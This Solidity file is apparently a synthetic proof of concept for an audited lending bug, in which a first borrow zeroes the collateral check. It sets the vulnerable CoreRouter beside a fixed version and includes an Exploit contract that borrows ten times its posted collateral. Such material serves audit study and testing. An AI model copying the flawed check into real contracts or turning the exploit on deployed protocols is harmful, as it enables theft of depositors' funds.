// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LEND — CoreRouter.borrow zeroes the collateral check on a first borrow
    (Sherlock 2025-05, H-27, finding 58396).
    SYNTHETIC, cheatcode-free. The ternary and the require are the audited check. */

interface LTokenInterface {
    function accrueInterest() external;
    function borrowIndex() external view returns (uint256);
}

interface LErc20Interface {
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract MiniToken is IERC20 {
    string public symbol = "lUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LToken is LTokenInterface, LErc20Interface {
    MiniToken public underlying;
    uint256 internal index = 1e18;

    constructor(MiniToken underlying_) {
        underlying = underlying_;
    }

    function accrueInterest() external {}

    function borrowIndex() external view returns (uint256) {
        return index;
    }

    function borrow(uint256 borrowAmount) external returns (uint256) {
        underlying.transfer(msg.sender, borrowAmount);
        return 0;
    }
}

contract LendStorage {
    struct BorrowMarketState {
        uint256 amount;
        uint256 borrowIndex;
    }

    uint256 public constant PRICE = 1e18;

    mapping(address => address) public underlyingTolToken;
    mapping(address => uint256) public collateralUSD;
    mapping(address => mapping(address => BorrowMarketState)) internal borrowBalance;

    function setUnderlyingTolToken(address underlying_, address lToken_) external {
        underlyingTolToken[underlying_] = lToken_;
    }

    function addCollateral(address user, uint256 usd) external {
        collateralUSD[user] += usd;
    }

    function getHypotheticalAccountLiquidityCollateral(address account, LToken, uint256, uint256 borrowAmount)
        external
        view
        returns (uint256 borrowed, uint256 collateral)
    {
        borrowed = (borrowAmount * PRICE) / 1e18;
        collateral = collateralUSD[account];
    }

    function getBorrowBalance(address user, address lToken) external view returns (BorrowMarketState memory) {
        return borrowBalance[user][lToken];
    }

    function updateBorrowBalance(address user, address lToken, uint256 amount, uint256 borrowIndex_) external {
        borrowBalance[user][lToken] = BorrowMarketState({amount: amount, borrowIndex: borrowIndex_});
    }

    function distributeBorrowerLend(address, address) external {}

    function addUserBorrowedAsset(address, address) external {}
}

contract CoreRouter {
    LendStorage public immutable lendStorage;
    uint256 public lastBorrowAmount;
    uint256 public lastBorrowed;
    uint256 public lastCollateral;

    constructor(address _lendStorage) {
        lendStorage = LendStorage(_lendStorage);
    }

    function enterMarkets(address) internal {}

    function borrow(uint256 _amount, address _token) external {
        require(_amount != 0, "Zero borrow amount");

        address _lToken = lendStorage.underlyingTolToken(_token);

        LTokenInterface(_lToken).accrueInterest();

        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount);

        LendStorage.BorrowMarketState memory currentBorrow = lendStorage.getBorrowBalance(msg.sender, _lToken);

        uint256 borrowAmount = currentBorrow.borrowIndex != 0
            ? ((borrowed * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex)
            : 0;

        lastBorrowAmount = borrowAmount;
        lastBorrowed = borrowed;
        lastCollateral = collateral;

        require(collateral >= borrowAmount, "Insufficient collateral"); // @> VULN: first borrow sets borrowAmount to 0, so collateral >= 0 always passes

        enterMarkets(_lToken);

        require(LErc20Interface(_lToken).borrow(_amount) == 0, "Borrow failed");

        IERC20(_token).transfer(msg.sender, _amount);

        lendStorage.distributeBorrowerLend(_lToken, msg.sender);

        if (currentBorrow.borrowIndex != 0) {
            uint256 _newPrinciple =
                (currentBorrow.amount * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex;
            lendStorage.updateBorrowBalance(
                msg.sender, _lToken, _newPrinciple + _amount, LTokenInterface(_lToken).borrowIndex()
            );
        } else {
            lendStorage.updateBorrowBalance(msg.sender, _lToken, _amount, LTokenInterface(_lToken).borrowIndex());
        }

        lendStorage.addUserBorrowedAsset(msg.sender, _lToken);
    }
}

contract CoreRouterFixed {
    LendStorage public immutable lendStorage;

    constructor(address _lendStorage) {
        lendStorage = LendStorage(_lendStorage);
    }

    function borrow(uint256 _amount, address _token) external {
        require(_amount != 0, "Zero borrow amount");
        address _lToken = lendStorage.underlyingTolToken(_token);
        LTokenInterface(_lToken).accrueInterest();
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount);
        require(collateral >= borrowed, "Insufficient collateral");
        require(LErc20Interface(_lToken).borrow(_amount) == 0, "Borrow failed");
        IERC20(_token).transfer(msg.sender, _amount);
    }
}

contract Exploit {
    MiniToken public token;
    LToken public lToken;
    LendStorage public lendStorage;
    CoreRouter public vuln;

    uint256 public collateralPosted;
    uint256 public borrowedReceived;

    uint256 internal constant COLLATERAL = 100e18;
    uint256 internal constant BORROW = 1000e18;

    constructor() {
        token = new MiniToken();
        lToken = new LToken(token);
        lendStorage = new LendStorage();
        vuln = new CoreRouter(address(lendStorage));
        lendStorage.setUnderlyingTolToken(address(token), address(lToken));
        token.mint(address(lToken), 2000e18);
    }

    function run() external {
        lendStorage.addCollateral(address(this), COLLATERAL);
        collateralPosted = COLLATERAL;

        uint256 balBefore = token.balanceOf(address(this));
        vuln.borrow(BORROW, address(token));
        borrowedReceived = token.balanceOf(address(this)) - balBefore;

        require(borrowedReceived == BORROW, "did not receive full borrow");
        require(vuln.lastBorrowAmount() == 0, "check was not zeroed");
        require(vuln.lastBorrowed() == BORROW, "hypothetical debt");
        require(vuln.lastCollateral() == COLLATERAL, "collateral");
        require(vuln.lastBorrowed() > vuln.lastCollateral(), "not undercollateralized");
        require(token.balanceOf(address(lToken)) == 1000e18, "reserve");
    }
}
